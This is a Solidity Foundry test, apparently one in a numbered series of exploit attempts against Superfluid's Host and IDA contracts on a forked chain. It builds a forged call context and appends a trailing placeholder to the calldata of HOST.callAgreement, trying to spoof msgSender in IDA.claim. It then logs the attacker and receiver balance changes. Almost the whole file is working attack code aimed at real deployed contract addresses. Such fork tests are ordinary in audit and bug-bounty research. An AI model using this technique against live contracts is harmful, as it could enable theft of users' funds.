// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @title Attempt63: Trailing-Bytes Claim through Real Host
/// @notice Tests whether a forged ctx can be injected via trailing bytes in
///         HOST.callAgreement(IDA, trailingBytesClaimCalldata, "").
///
///         The idea: IDA.claim's 5th parameter is `ctx`. Normally the Host
///         replaces the placeholder (new bytes(0)) at the end of callData with
///         the real ctx. If we put the forged ctx as the 5th ABI-decoded param
///         and append a second placeholder at the end, the Host may replace
///         the trailing placeholder, leaving the forged ctx in place as the
///         actual `ctx` param that IDA reads.

// ── Minimal interfaces ──────────────────────────────────────────────────

interface ISuperfluid {
    function callAgreement(
        address agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory);
}

interface IIDA {
    function claim(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber,
        bytes calldata ctx
    ) external returns (bytes memory);

    function createIndex(
        address token,
        uint32 indexId,
        bytes calldata ctx
    ) external returns (bytes memory);

    function updateSubscription(
        address token,
        uint32 indexId,
        address subscriber,
        uint128 units,
        bytes calldata ctx
    ) external returns (bytes memory);

    function updateIndex(
        address token,
        uint32 indexId,
        uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory);

    function getIndex(
        address token,
        address publisher,
        uint32 indexId
    )
        external
        view
        returns (
            bool exist,
            uint128 indexValue,
            uint128 totalUnitsApproved,
            uint128 totalUnitsPending
        );

    function getSubscription(
        address token,
        address publisher,
        uint32 indexId,
        address subscriber
    )
        external
        view
        returns (
            bool exist,
            bool approved,
            uint128 units,
            uint256 pendingDistribution
        );
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address)
        external
        view
        returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
    function getHost() external view returns (address);
}

// ── Inline ContextUtils ─────────────────────────────────────────────────

library CtxLib {
    uint256 internal constant CALL_INFO_CALL_TYPE_SHIFT = 32;

    function encodeCallInfo(uint8 appCallbackLevel, uint8 callType)
        internal
        pure
        returns (uint256 callInfo)
    {
        callInfo =
            uint256(appCallbackLevel) |
            (uint256(callType) << CALL_INFO_CALL_TYPE_SHIFT);
    }

    function encodeCtx(
        uint8 appCallbackLevel,
        uint8 callType,
        uint256 timestamp,
        address msgSender,
        bytes4 agreementSelector,
        bytes memory userData,
        uint256 appCreditGranted,
        uint256 appCreditWantedDeprecated,
        int256 appCreditUsed,
        address appAddress,
        address appCreditToken
    ) internal pure returns (bytes memory) {
        uint256 callInfo = encodeCallInfo(appCallbackLevel, callType);
        uint256 creditIO = uint256(uint128(appCreditGranted)) |
            (uint256(uint128(appCreditWantedDeprecated)) << 128);

        return
            abi.encode(
                abi.encode(
                    callInfo,
                    timestamp,
                    msgSender,
                    agreementSelector,
                    userData
                ),
                abi.encode(creditIO, appCreditUsed, appAddress, appCreditToken)
            );
    }
}

// ── Simple receiver (non-SuperApp, unapproved subscriber) ───────────────

contract Receiver63 {
    receive() external payable {}
}

// ── Test contract ───────────────────────────────────────────────────────

contract Attempt63_TrailingClaim is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    uint32 constant IDX = 888_000_000;

    Receiver63 receiver;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"), 27039967);
    }

    // ═════════════════════════════════════════════════════════════════════
    // Main test
    // ═════════════════════════════════════════════════════════════════════

    function test_trailing_bytes_claim() public {
        console.log("========== Attempt63: Trailing-Bytes Claim ==========");

        // ── Step 1: Setup ─────────────────────────────────────────────
        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);

        // Upgrade 0.1 ETH to MATICx
        IMATICx(MATICx).upgradeByETH{value: 0.1 ether}();
        uint256 atkMx = IMATICx(MATICx).balanceOf(ATTACKER);
        console.log("[setup] attacker MATICx:", atkMx);

        // ── Step 2: Create IDA index (publisher = attacker, indexId = 888000000)
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.createIndex.selector,
                MATICx,
                IDX,
                new bytes(0)
            ),
            ""
        );
        console.log("[setup] IDA index created, indexId:", IDX);

        // ── Step 3: Deploy Receiver and subscribe with units=1 (unapproved)
        receiver = new Receiver63();
        console.log("[setup] receiver deployed:", address(receiver));

        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateSubscription.selector,
                MATICx,
                IDX,
                address(receiver),
                uint128(1),
                new bytes(0)
            ),
            ""
        );
        console.log("[setup] subscription created (units=1, unapproved)");

        // ── Step 4: updateIndex to set indexValue = 0.01 ether
        //    pendingDistribution = 0.01 MATICx for the unapproved subscriber
        ISuperfluid(HOST).callAgreement(
            IDA,
            abi.encodeWithSelector(
                IIDA.updateIndex.selector,
                MATICx,
                IDX,
                uint128(0.01 ether),
                new bytes(0)
            ),
            ""
        );
        console.log("[setup] index updated to 0.01 ether");

        vm.stopPrank();

        // Verify the subscription state
        {
            (
                bool exist,
                bool approved,
                uint128 units,
                uint256 pending
            ) = IIDA(IDA).getSubscription(
                    MATICx,
                    ATTACKER,
                    IDX,
                    address(receiver)
                );
            console.log("[verify] sub exists:", exist);
            console.log("[verify] sub approved:", approved);
            console.log("[verify] sub units:", units);
            console.log("[verify] pendingDistribution:", pending);
            require(exist, "subscription does not exist");
            require(!approved, "subscription should be unapproved");
            require(pending > 0, "no pending distribution");
        }

        // ── Step 5: Record balances BEFORE ─────────────────────────
        uint256 atkBefore = IMATICx(MATICx).balanceOf(ATTACKER);
        uint256 recBefore = IMATICx(MATICx).balanceOf(address(receiver));
        (int256 atkRtBefore, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
            ATTACKER
        );
        (int256 recRtBefore, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
            address(receiver)
        );
        console.log("[before] attacker balanceOf:", atkBefore);
        console.log("[before] receiver balanceOf:", recBefore);
        console.log("[before] attacker realtimeBal:", atkRtBefore);
        console.log("[before] receiver realtimeBal:", recRtBefore);

        // ── Step 6: Build the trailing-bytes claim calldata ─────────
        //
        // Structure:
        //   abi.encodePacked(
        //     abi.encodeWithSelector(IDA.claim.selector, token, publisher, indexId, subscriber, forgedCtxBytes),
        //     abi.encode(new bytes(0))   // <-- placeholder that Host's _replacePlaceholderCtx finds
        //   )
        //
        // The forged ctx has:
        //   - msgSender = ATTACKER (so IDA thinks the caller is ATTACKER)
        //   - callType = 1 (AGREEMENT)
        //   - appCallbackLevel = 0

        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, // appCallbackLevel
            1, // callType = CALL_TYPE_AGREEMENT
            block.timestamp,
            ATTACKER, // msgSender = attacker
            IIDA.claim.selector,
            "", // userData
            0, // appCreditGranted
            0, // appCreditWantedDeprecated
            0, // appCreditUsed
            address(0), // appAddress
            address(0) // appCreditToken
        );

        console.log("[build] forgedCtx length:", forgedCtx.length);

        // Inner calldata: claim(token, publisher, indexId, subscriber, forgedCtx)
        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            ATTACKER, // publisher
            IDX,
            address(receiver), // subscriber
            forgedCtx // <-- forged ctx occupies the 5th parameter slot
        );

        console.log("[build] innerCalldata length:", innerCalldata.length);

        // Append abi.encode(new bytes(0)) as trailing placeholder
        bytes memory placeholder = abi.encode(new bytes(0));
        console.log("[build] placeholder length:", placeholder.length);

        bytes memory trailingCalldata = abi.encodePacked(
            innerCalldata,
            placeholder
        );
        console.log("[build] trailingCalldata total length:", trailingCalldata.length);

        // ── Step 7: Execute via HOST.callAgreement ──────────────────
        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, trailingCalldata, "") returns (
            bytes memory retData
        ) {
            console.log(">>> CLAIM SUCCEEDED <<<");
            console.log("    returnData length:", retData.length);

            // Record balances AFTER
            uint256 atkAfter = IMATICx(MATICx).balanceOf(ATTACKER);
            uint256 recAfter = IMATICx(MATICx).balanceOf(address(receiver));
            (int256 atkRtAfter, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
                ATTACKER
            );
            (int256 recRtAfter, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
                address(receiver)
            );

            console.log("[after] attacker balanceOf:", atkAfter);
            console.log("[after] receiver balanceOf:", recAfter);
            console.log("[after] attacker realtimeBal:", atkRtAfter);
            console.log("[after] receiver realtimeBal:", recRtAfter);

            int256 atkDelta = int256(atkAfter) - int256(atkBefore);
            int256 recDelta = int256(recAfter) - int256(recBefore);
            console.log("[delta] attacker balanceOf delta:", atkDelta);
            console.log("[delta] receiver balanceOf delta:", recDelta);
            console.log(
                "[delta] attacker realtimeBal delta:",
                atkRtAfter - atkRtBefore
            );
            console.log(
                "[delta] receiver realtimeBal delta:",
                recRtAfter - recRtBefore
            );

            // Check subscription state after claim
            (
                bool exist2,
                bool approved2,
                uint128 units2,
                uint256 pending2
            ) = IIDA(IDA).getSubscription(
                    MATICx,
                    ATTACKER,
                    IDX,
                    address(receiver)
                );
            console.log("[after] sub exists:", exist2);
            console.log("[after] sub approved:", approved2);
            console.log("[after] sub units:", units2);
            console.log("[after] pendingDistribution:", pending2);
        } catch Error(string memory reason) {
            console.log(">>> CLAIM REVERTED (reason) <<<");
            console.log("    reason:", reason);
        } catch (bytes memory rawErr) {
            console.log(">>> CLAIM REVERTED (raw) <<<");
            console.log("    rawErr length:", rawErr.length);
            // Log first 4 bytes (error selector) if available
            if (rawErr.length >= 4) {
                bytes4 sel;
                assembly {
                    sel := mload(add(rawErr, 32))
                }
                console.log("    error selector:");
                console.logBytes4(sel);
            }
            // Log up to first 128 bytes for debugging
            if (rawErr.length > 0) {
                console.log("    raw error bytes:");
                console.logBytes(
                    rawErr.length > 128 ? _slice(rawErr, 0, 128) : rawErr
                );
            }
        }

        // ── Step 7b: Also try baseline normal claim for comparison ──
        console.log("");
        console.log("========== Baseline: Normal claim (no trailing) ==========");

        uint256 snapId = vm.snapshot();

        uint256 recBefore2 = IMATICx(MATICx).balanceOf(address(receiver));
        (int256 recRtBefore2, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
            address(receiver)
        );

        bytes memory normalCalldata = abi.encodeWithSelector(
            IIDA.claim.selector,
            MATICx,
            ATTACKER,
            IDX,
            address(receiver),
            new bytes(0)
        );

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, normalCalldata, "") {
            uint256 recAfter2 = IMATICx(MATICx).balanceOf(address(receiver));
            (int256 recRtAfter2, , ) = IMATICx(MATICx).realtimeBalanceOfNow(
                address(receiver)
            );
            console.log("[baseline] CLAIM SUCCEEDED");
            console.log(
                "[baseline] receiver balanceOf delta:",
                int256(recAfter2) - int256(recBefore2)
            );
            console.log(
                "[baseline] receiver realtimeBal delta:",
                recRtAfter2 - recRtBefore2
            );
        } catch Error(string memory reason) {
            console.log("[baseline] REVERTED:", reason);
        } catch (bytes memory rawErr) {
            console.log("[baseline] REVERTED (raw), len:", rawErr.length);
        }

        vm.revertTo(snapId);

        console.log("========== Attempt63 Complete ==========");
    }

    // ── Helper: slice bytes ─────────────────────────────────────────────
    function _slice(
        bytes memory data,
        uint256 start,
        uint256 len
    ) internal pure returns (bytes memory) {
        bytes memory result = new bytes(len);
        for (uint256 i = 0; i < len && (start + i) < data.length; i++) {
            result[i] = data[start + i];
        }
        return result;
    }
}
